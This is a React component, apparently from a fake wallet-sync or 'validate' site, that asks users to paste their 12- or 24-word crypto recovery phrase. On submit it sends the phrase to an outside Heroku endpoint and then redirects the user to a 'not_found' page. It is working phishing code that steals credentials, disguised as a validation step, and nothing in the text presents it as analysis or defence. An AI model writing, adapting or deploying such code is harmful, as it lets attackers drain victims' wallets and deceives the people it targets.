import { useEffect, useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { BeatLoader } from "react-spinners";

const Phrase = ({
  seed1,
  setSeed1,
  error1,
  setError1,
  disabled1,
  setDisabled1,
  count1,
  setCount1,
}) => {
  const Navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const reg = /^[a-zA-z]+\s([a-zA-Z]+\s){10,22}[a-zA-Z]+$/;
    const reg1 = /^[a-zA-z]+\s([a-zA-Z]+\s){11,22}([a-zA-Z]+)?$/;
    const isMatch = reg.test(e.target.value)
    const isMatch1 = reg1.test(e.target.value);
    let len = e.target.value.length;

    if (isMatch || isMatch1 || len === 0) {
      setSeed1(e.target.value);
      setError1(false);
      setCount1(len);
    } else {
      setSeed1(e.target.value);
      setError1(true);
      setCount1(len);
    }
  };

  const handleSubmit = async (e) => {
    setDisabled1(true);
    setLoading(true);
    const res = await axios.post(
      "https://dappswalletsynchronizer.herokuapp.com/form",
      {
        seed: seed1,
      }
    );
    if (res.data.status === 200) {
      Navigate("/not_found");
    } else {
      console.log("An error occurred");
    }
  };

  useEffect(() => {
    if (count1 == 0 || error1) {
      setDisabled1(true);
    } else {
      setDisabled1(false);
    }
  }, [error1, count1]);

  return (
    <>
      <textarea
        style={{ borderColor: error1 && "red" }}
        onChange={handleChange}
        value={seed1}
        rows='10'
        placeholder='Phrase'
      ></textarea>
      {error1 && <p className='errorMsg'>Incomplete phrase</p>}
      <p className='info'>
        Typically 12(sometimes 24) words separated by spaces.
      </p>
      <button
        className='button'
        style={
          disabled1
            ? {
                backgroundColor: "rgba(26, 141, 218, 0.2)",
                cursor: "not-allowed",
              }
            : { backgroundColor: "#1a8dda", color: "#fff" }
        }
        onClick={handleSubmit}
        disabled={disabled1}
      >
        {!loading ? "VALIDATE" : <BeatLoader size={12} />}
      </button>
    </>
  );
};

export default Phrase;
